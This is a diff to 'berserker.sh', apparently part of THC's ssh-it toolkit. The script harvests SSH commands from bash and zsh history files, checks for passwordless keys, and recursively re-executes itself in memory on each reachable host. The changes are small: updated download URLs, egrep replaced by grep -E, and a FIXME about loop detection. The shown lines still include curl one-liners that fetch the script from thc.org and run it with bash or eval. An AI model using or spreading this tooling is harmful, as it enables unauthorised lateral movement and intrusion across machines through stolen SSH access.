@@ -5,8 +5,8 @@
 # This script might be executed 'in memory' with one of these two commands:
 #      bash -c "$(cat src/funcs src/berserker.sh)"
 #      bash -c "$(cat bs)"
-#      export BS="$(curl -fsSL ssh-it.thc.org/bs)" && bash -c "$BS"
-#      bash -c "IFS='' BS=\"\$(curl -fsSL ssh-it.thc.org/bs)\" && eval \$BS"
+#      export BS="$(curl -fsSL https://thc.org/ssh-it/bs)" && bash -c "$BS"
+#      bash -c "IFS='' BS=\"\$(curl -fsSL https://thc.org/ssh-it/bs)\" && eval \$BS"
 #
 # BS_DEPTH=8       The depth before the berseker stops
 # THC_DEBUG=1      Enable debug output
@@ -21,7 +21,7 @@ if [[ "$0" != "bash" ]]; then
 	IFS="" BS="$(cat "${BINDIR}/funcs" "${0}")"
 else
 	# HERE: executed in memory. Must make sure that BS= contains myself.
-	[[ -z $_BS ]] && [[ -z $BS ]] && ERREXIT 127 "Use '${CDM}(export BS=\"\$(curl -fsDL ssh-it.thc.org/bs)\" && bash -c \"\$BS\")${CN}'"
+	[[ -z $_BS ]] && [[ -z $BS ]] && ERREXIT 127 "Use '${CDM}(export BS=\"\$(curl -fsDL https://thc.org/ssh-it/bs)\" && bash -c \"\$BS\")${CN}'"
 fi
 # IFS="" BS="$(cat egg.sh)"
 # Escape any ' to '"'"' so that $_BS can be passed to export _BS='$_BS'; bash -c "$_BS"
@@ -59,7 +59,7 @@ ERREXIT_CLEANUP()
 }
 
 # Stubs to exract ssh command from history file
-ZSH_HST_SSH="egrep '^:[[:space:]]+[0-9:]+;ssh[[:space:]]+'|cut -d\; -f2-"
+ZSH_HST_SSH="grep -E '^:[[:space:]]+[0-9:]+;ssh[[:space:]]+'|cut -d\; -f2-"
 BASH_HST_SSH="grep '^ssh '"
 
 is_passwordless()
@@ -162,7 +162,7 @@ ssh_from_history()
 set_myidonce()
 {
 	command -v hostnamectl >/dev/null && _BS_LOCALID_ROOT="$(hostnamectl | md5sum)" || \
-		_BS_LOCALID_ROOT="$(((ifconfig || ip link show) 2>/dev/null | egrep '(ether|HWaddr)'; hostname)  | md5sum)"
+		_BS_LOCALID_ROOT="$(((ifconfig || ip link show) 2>/dev/null | grep -E '(ether|HWaddr)'; hostname)  | md5sum)"
 
 	if [[ "$UID" -eq 0 ]]; then
 		_BS_LOCALID_USER="$_BS_LOCALID_ROOT"
@@ -494,7 +494,7 @@ for c in "${CMD_LIST[@]}"; do
 			THC_DEBUG=\"$THC_DEBUG\" BS_HISTFILE=\"${BS_HISTFILE}\" BS_DEPTH=\"$BS_DEPTH\" \
 			BS_THIS_DEPTH=\"$((BS_THIS_DEPTH+1))\" bash -c \"\$BS\""; } 2>&1 1>&3 3>&- )"; } 3>&1 || ret=$?
 	nkey="$(echo "$err" | grep -c 'tions that can continue')"
-	# nkey="$(echo "$err" | egrep -c '(Trying private key|ffering public key)')"
+	# nkey="$(echo "$err" | grep -E -c '(Trying private key|ffering public key)')"
 	if [[ $ret -ne 0 ]]; then
 		err="$(echo "$err" | grep -v ^debug | tr -d "\r" )"
 		{ [[ $err = *"ermission"* ]] && MSG_ERROR "Permission denied"; } || \
@@ -523,6 +523,9 @@ for c in "${CMD_LIST[@]}"; do
 		MSG_TRY_COMPLETE "$k"
 		unset last_was_failed
 	fi
+# FIXME: The LOOP_DB that is populated within msg_dispatch is only available outside
+# the for-loop. Thus loops like this wont be detected:
+# A -> B -> C followed by A -> C
 done | msg_dispatch
 
 # [[ -n $last_was_failed ]] && printf "%*s\r" "${COLUMNS}" ""
